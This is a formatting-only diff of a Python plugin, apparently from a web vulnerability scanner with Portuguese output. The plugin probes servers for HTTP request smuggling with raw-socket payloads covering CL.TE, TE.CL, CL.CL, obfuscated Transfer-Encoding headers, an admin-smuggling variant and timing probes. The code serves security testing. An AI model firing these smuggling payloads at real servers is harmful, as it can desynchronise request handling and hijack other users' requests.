@@ -2,16 +2,9 @@
 import socket
 import time
 
-
 # ──────────── SMUGGLING PAYLOADS ────────────
 SMUGGLE_PAYLOADS = {
-    "CL.TE": (
-        "POST / HTTP/1.1\r\n"
-        "Host: {target}\r\n"
-        "Content-Length: 6\r\n"
-        "Transfer-Encoding: chunked\r\n\r\n"
-        "0\r\n\r\nG"
-    ),
+    "CL.TE": ("POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG"),
     "TE.CL": (
         "POST / HTTP/1.1\r\n"
         "Host: {target}\r\n"
@@ -27,34 +20,16 @@ SMUGGLE_PAYLOADS = {
         "Transfer-encoding: cow\r\n\r\n"
         "5c\r\nGPOST / HTTP/1.1\r\n\r\n0\r\n\r\n"
     ),
-    "CL.CL": (
-        "POST / HTTP/1.1\r\n"
-        "Host: {target}\r\n"
-        "Content-Length: 0\r\n"
-        "Content-Length: 6\r\n\r\n"
-        "ATTACK"
-    ),
+    "CL.CL": ("POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 0\r\nContent-Length: 6\r\n\r\nATTACK"),
     # 2026 additions
     "TE_SPACE": (
-        "POST / HTTP/1.1\r\n"
-        "Host: {target}\r\n"
-        "Content-Length: 4\r\n"
-        "Transfer-Encoding : chunked\r\n\r\n"
-        "0\r\n\r\nG"
+        "POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 4\r\nTransfer-Encoding : chunked\r\n\r\n0\r\n\r\nG"
     ),
     "TE_TAB": (
-        "POST / HTTP/1.1\r\n"
-        "Host: {target}\r\n"
-        "Content-Length: 4\r\n"
-        "Transfer-Encoding:\tchunked\r\n\r\n"
-        "0\r\n\r\nG"
+        "POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 4\r\nTransfer-Encoding:\tchunked\r\n\r\n0\r\n\r\nG"
     ),
     "TE_NEWLINE": (
-        "POST / HTTP/1.1\r\n"
-        "Host: {target}\r\n"
-        "Content-Length: 4\r\n"
-        "Transfer-Encoding\r\n : chunked\r\n\r\n"
-        "0\r\n\r\nG"
+        "POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 4\r\nTransfer-Encoding\r\n : chunked\r\n\r\n0\r\n\r\nG"
     ),
     "TE_COMMA": (
         "POST / HTTP/1.1\r\n"
@@ -64,11 +39,7 @@ SMUGGLE_PAYLOADS = {
         "0\r\n\r\nG"
     ),
     "TE_XCHUNKED": (
-        "POST / HTTP/1.1\r\n"
-        "Host: {target}\r\n"
-        "Content-Length: 4\r\n"
-        "Transfer-Encoding: xchunked\r\n\r\n"
-        "0\r\n\r\nG"
+        "POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 4\r\nTransfer-Encoding: xchunked\r\n\r\n0\r\n\r\nG"
     ),
     "CL_TE_ADMIN": (
         "POST / HTTP/1.1\r\n"
@@ -82,18 +53,10 @@ SMUGGLE_PAYLOADS = {
 # ──────────── TIME-BASED DETECTION ────────────
 TIME_PAYLOADS = {
     "CL.TE_TIME": (
-        "POST / HTTP/1.1\r\n"
-        "Host: {target}\r\n"
-        "Content-Length: 4\r\n"
-        "Transfer-Encoding: chunked\r\n\r\n"
-        "1\r\nA\r\nQ"
+        "POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nA\r\nQ"
     ),
     "TE.CL_TIME": (
-        "POST / HTTP/1.1\r\n"
-        "Host: {target}\r\n"
-        "Content-Length: 6\r\n"
-        "Transfer-Encoding: chunked\r\n\r\n"
-        "0\r\n\r\nX"
+        "POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX"
     ),
 }
 
@@ -124,21 +87,25 @@ def _analyze_smuggle(response, method):
     for indicator, desc in indicators:
         if indicator in response:
             return {
-                "tipo": "HTTP_SMUGGLING", "metodo": method,
-                "indicador": indicator, "severidade": "CRITICO",
+                "tipo": "HTTP_SMUGGLING",
+                "metodo": method,
+                "indicador": indicator,
+                "severidade": "CRITICO",
                 "descricao": desc,
             }
 
     # Check for different status codes indicating desync
     if "400 Bad Request" in response and method.startswith("TE"):
         return {
-            "tipo": "HTTP_SMUGGLING_POSSIBLE", "metodo": method,
+            "tipo": "HTTP_SMUGGLING_POSSIBLE",
+            "metodo": method,
             "severidade": "ALTO",
             "descricao": f"400 Bad Request com {method} — possível desync!",
         }
     if "405 Method Not Allowed" in response:
         return {
-            "tipo": "HTTP_SMUGGLING_DESYNC", "metodo": method,
+            "tipo": "HTTP_SMUGGLING_DESYNC",
+            "metodo": method,
             "severidade": "CRITICO",
             "descricao": "405 Method Not Allowed — backend recebeu método diferente!",
         }
@@ -154,8 +121,10 @@ def _test_time_based(target, method, payload):
 
     if response == "TIMEOUT" or elapsed > 8:
         return {
-            "tipo": "HTTP_SMUGGLING_TIME", "metodo": method,
-            "tempo": round(elapsed, 2), "severidade": "ALTO",
+            "tipo": "HTTP_SMUGGLING_TIME",
+            "metodo": method,
+            "tempo": round(elapsed, 2),
+            "severidade": "ALTO",
             "descricao": f"Timeout ({elapsed:.1f}s) — possível desync via {method}!",
         }
     return None
@@ -163,12 +132,7 @@ def _test_time_based(target, method, payload):
 
 def _test_transfer_encoding_support(target):
     """Verifica como o servidor processa Transfer-Encoding."""
-    payload = (
-        "GET / HTTP/1.1\r\n"
-        f"Host: {target}\r\n"
-        "Transfer-Encoding: chunked\r\n\r\n"
-        "0\r\n\r\n"
-    )
+    payload = f"GET / HTTP/1.1\r\nHost: {target}\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n"
     response = _send_raw(target, payload)
     if "200 OK" in response or "301" in response:
         return True
@@ -209,7 +173,6 @@ def run(target, ip, open_ports, banners):
     return {
         "plugin": "http_smuggling",
         "versao": "2026.1",
-        "tecnicas": ["cl_te", "te_cl", "te_te", "cl_cl", "te_obfuscation",
-                      "time_based", "admin_smuggle", "raw_socket"],
+        "tecnicas": ["cl_te", "te_cl", "te_te", "cl_cl", "te_obfuscation", "time_based", "admin_smuggle", "raw_socket"],
         "resultados": vulns if vulns else "Nenhum HTTP smuggling detectado",
     }
